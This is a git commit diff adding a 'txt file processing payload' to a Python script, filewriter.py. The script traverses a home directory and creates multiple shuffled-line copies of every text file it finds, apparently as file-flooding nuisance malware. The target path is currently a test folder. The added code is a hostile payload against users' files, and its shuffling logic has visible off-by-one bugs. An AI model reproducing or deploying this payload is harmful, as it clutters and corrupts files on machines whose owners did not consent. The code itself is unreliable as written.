566a51bec6c4a4222648246d8ad157653c9d0c26
telekobold <dev@telekobold.de>
2022-01-14 22:12:56 +0100

    Add txt file processing payload

--- python/filewriter.py
+++ python/filewriter.py
@@ -18,6 +18,7 @@ do not abuse it to cause any harm!
 from os import listdir
 from os.path import expanduser, islink, isdir, isfile
 import mimetypes
+from random import randint
 
 
 
@@ -39,7 +40,8 @@ def users_home_dir():
     :returns: the user's home directory on both Unix and Windows platforms
     """
     # return expanduser("~")
-    return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
+    # return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
+    return "/home/telekobold/TestVerzeichnis/Linux-Test-Kopie" # For testing purposes
 
 
 def is_file_type(file, filetype):
@@ -83,33 +85,126 @@ def traverse_dirs(curr_file):
         return
     if isfile(curr_file):
         if is_file_type(curr_file, "txt"):
-            print("TEXT file {}".format(curr_file))
+            print("TEXT file {}".format(curr_file)) # test output
             process_text_file(curr_file)
+        """
         elif is_file_type(curr_file, "docx"):
-            print("DOCX file {}".format(curr_file))
+            print("DOCX file {}".format(curr_file)) # test output
             process_docx_file(curr_file)
         elif is_file_type(curr_file, "odt"):
-            print("ODT file {}".format(curr_file))
+            print("ODT file {}".format(curr_file)) # test output
             process_odt_file(curr_file)
         elif is_file_type(curr_file, "jpeg") or is_file_type(curr_file, "jpg") or is_file_type(curr_file, "png"):
-            print("image file {}".format(curr_file))
+            print("image file {}".format(curr_file)) # test output
             process_image_file(curr_file)
         elif is_file_type(curr_file, "mp3") or is_file_type(curr_file, "ogg"):
-            print("music file {}".format(curr_file))
+            print("music file {}".format(curr_file)) # test output
             process_music_file(curr_file)
+        """
     if isdir(curr_file):
-        print("DIR {}".format(curr_file))
+        # print("DIR {}".format(curr_file)) # test output
         for file in listdir(curr_file):
             # TODO: Adapt for Windows ("\" instead of "/").
             traverse_dirs("{}/{}".format(curr_file, file))
+
+    
+def n_rand_numbers(n):
+    """
+    :n: The length of the list to return.
+    :returns: a list of n numbers between 1 and n, randomly shuffled, 
+    but unique (meaning that each number appears only once in the list); 
+    `None` for n <= 0.
+    """
+    result = []
+    
+    if n <= 0:
+        print("For n_rand_numbers, only positive values make sense!")
+        return None
+    while len(result) < n:
+        i = randint(0,n)
+        if i not in result:
+            result.append(i)
+    
+    return result
+
+
+def shuffle_filename(filename):
+    # Determine the lines the text file has and use this number of lines 
+    # to randomly shuffle the positions of those lines.
+    # TODO: Implement shuffling
+    return filename
+
+
+def read_file_to_dict(filename):
+    """
+    Reads the passed file line by line.
+    
+    :returns: a dictionary whose keys are the line numbers (integer values) 
+              and the appropriate values being the content of this line (string values).
+    """
+    result = {}
+    file = open(filename, "r")
+    lines = file.readlines()
+    file.close()
+    
+    # NOTE: The line indexing stars with 0.
+    for i, line in zip(range(len(lines)), lines):
+        result[i] = line
+        
+    print("read_file_to_dict: result = {}".format(result)) # test output
+    return result
+
+
+def write_dict_to_file(dictionary, filename):
+    """
+    Writes every value of `dictionary` to a new line of `file`.
+    
+    :dictionary: the dictionary that should be written to a file.
+    :filename: the name of the file that should be filled with dictionary's content.
+    """
+    file = open(filename, "w")
+    for i in range(len(dictionary)):
+        file.writelines(dictionary[i])
+    file.close()
+
+
+def shuffle_dict_content(dictionary):
+    """
+    :dictionary: an arbitrary dictionary
+    :returns: a dictionary which contains all values of the input dictionary, 
+              but with randomly shuffled values.
+    """
+    result = {}
+    rand_numbers = n_rand_numbers(len(dictionary)-1)
+    print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
+    
+    for i in range(len(dictionary)-1):
+        result[i] = dictionary[rand_numbers[i]]
+        
+    return result
     
     
-def process_text_file(file):
+def process_text_file(input_filename):
     """
-    Produces FILES_TO_WRITE_PER_DIR new text files where each file contains 
-    the content of this text file, but with randomly shuffled content.
+    Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains 
+    the content of the text file with `input_filename`, but with randomly shuffled
+    content. The new files are created in the same directory as `input_filename`.
+    
+    :input_filename: The filename of the file that should be duplicated
+                     multiple times with shuffled file name and content.
     """
-    pass
+    global FILES_TO_WRITE_PER_DIR
+    input_file_content = read_file_to_dict(input_filename)
+    
+    for i in range(FILES_TO_WRITE_PER_DIR):
+        # filename = shuffle_filename(input_filename)
+        # TODO: Replace the if-else construct by shuffle_filename usage:
+        if input_filename.endswith(".txt"):
+            filename = input_filename[0:len(input_filename)-4:1] + str(i) + ".txt"
+        else:
+            filename = input_filename + str(i)
+        file_content = shuffle_dict_content(input_file_content)
+        write_dict_to_file(file_content, filename)
 
 
 def process_docx_file(file):
